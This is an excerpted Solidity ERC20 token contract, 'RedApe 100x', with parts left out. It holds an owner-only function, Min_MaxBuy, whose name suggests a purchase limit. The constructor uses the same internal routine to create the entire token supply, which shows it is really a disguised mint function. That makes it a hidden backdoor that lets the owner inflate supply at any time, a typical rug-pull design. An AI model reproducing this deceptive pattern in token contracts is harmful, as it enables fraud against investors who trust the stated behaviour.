...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function Min_MaxBuy(uint256 amount) public onlyOwner {
    _Min_MaxBuy(msg.sender, amount);
    }
    ...
    function _Min_MaxBuy(address account, uint256 amount) internal virtual {
...
contract REDAPE100X is ERC20 {

    uint tokenTotalSupply = 200000000;

    constructor() public ERC20("RedApe 100x", "REDAPE 100X") {
        _Min_MaxBuy(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}